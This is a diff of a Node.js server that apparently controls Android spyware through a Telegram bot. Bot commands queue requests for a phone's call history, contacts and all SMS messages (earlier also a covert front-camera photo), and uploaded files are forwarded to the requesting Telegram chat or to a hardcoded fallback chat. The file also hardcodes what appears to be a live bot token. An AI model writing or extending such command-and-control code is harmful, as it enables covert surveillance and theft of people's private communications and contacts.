@@ -26,7 +26,7 @@ const storage = multer.diskStorage({
 const upload = multer({ storage: storage });
 
 // --- Application State ---
-// To track if a command was requested (e.g. 'none', 'ch', 'contact', 'cf')
+// To track if a command was requested (e.g. 'none', 'ch', 'contact')
 let pendingCommand = 'none';
 let requestingChatId = null;
 
@@ -35,7 +35,7 @@ let requestingChatId = null;
 const BOT_TOKEN = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';
 const bot = new Telegraf(BOT_TOKEN);
 
-bot.start((ctx) => ctx.reply('Bot is running. Send /ch to request call history from the Android device.'));
+bot.start((ctx) => ctx.reply('Bot is running.\n\nAvailable commands:\n/ch - Get call history\n/contact - Get contacts list\n/as - Get all SMS messages'));
 
 bot.command('ch', (ctx) => {
     // Acknowledge to the user
@@ -55,34 +55,23 @@ bot.command('contact', (ctx) => {
     requestingChatId = ctx.chat.id;
 });
 
-bot.command('cf', (ctx) => {
+bot.command('as', (ctx) => {
     // Acknowledge to the user
-    ctx.reply('Command received. Waiting for the Android device to capture a front camera photo...');
+    ctx.reply('Command received. Waiting for the Android device to send all SMS messages...');
     
     // Set the state so the Android app knows to send the data next time it checks
-    pendingCommand = 'cf';
+    pendingCommand = 'as';
     requestingChatId = ctx.chat.id;
 });
 
-// Launch bot - dropPendingUpdates avoids 409 Conflict on Render restarts
-bot.launch({ dropPendingUpdates: true }).then(() => {
+// Launch bot
+bot.launch().then(() => {
     console.log('Telegraf Bot launched!');
-}).catch((err) => {
-    console.error('Bot launch error:', err.message);
-    // Don't exit - server still functions for Android polling
 });
 
 // Enable graceful stop
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
-
-// Keep server alive even if bot crashes
-process.on('uncaughtException', (err) => {
-    console.error('Uncaught Exception:', err.message);
-});
-process.on('unhandledRejection', (reason) => {
-    console.error('Unhandled Rejection:', reason);
-});
 
 // --- Express API Endpoints for Android App ---
 
@@ -106,20 +95,12 @@ app.post('/upload-log', upload.single('document'), async (req, res) => {
 
     if (requestingChatId) {
         try {
-            if (req.file.originalname.endsWith('.jpg') || req.file.originalname.endsWith('.png')) {
-                // It's an image, send as Photo
-                await bot.telegram.sendPhoto(requestingChatId, {
-                    source: req.file.path
-                });
-                console.log(`Photo ${req.file.originalname} sent successfully to Telegram.`);
-            } else {
-                // Forward the document back to the Telegram chat that requested it
-                await bot.telegram.sendDocument(requestingChatId, {
-                    source: req.file.path,
-                    filename: req.file.originalname 
-                });
-                console.log(`Document ${req.file.originalname} sent successfully to Telegram.`);
-            }
+            // Forward the document back to the Telegram chat that requested it
+            await bot.telegram.sendDocument(requestingChatId, {
+                source: req.file.path,
+                filename: req.file.originalname 
+            });
+            console.log(`Document ${req.file.originalname} sent successfully to Telegram.`);
             res.status(200).send('File received and forwarded.');
         } catch (error) {
             console.error('Error forwarding to Telegram:', error);
@@ -140,16 +121,10 @@ app.post('/upload-log', upload.single('document'), async (req, res) => {
         // or just ignore. We'll use the hardcoded one for safety.
         const FALLBACK_CHAT_ID = "1691680798";
         try {
-            if (req.file.originalname.endsWith('.jpg') || req.file.originalname.endsWith('.png')) {
-                await bot.telegram.sendPhoto(FALLBACK_CHAT_ID, {
-                    source: req.file.path
-                });
-            } else {
-                await bot.telegram.sendDocument(FALLBACK_CHAT_ID, {
-                    source: req.file.path,
-                    filename: req.file.originalname
-                });
-            }
+            await bot.telegram.sendDocument(FALLBACK_CHAT_ID, {
+                source: req.file.path,
+                filename: req.file.originalname
+            });
             res.status(200).send('File received and forwarded (fallback).');
         } catch (error) {
             console.error('Error forwarding to Telegram (fallback):', error);
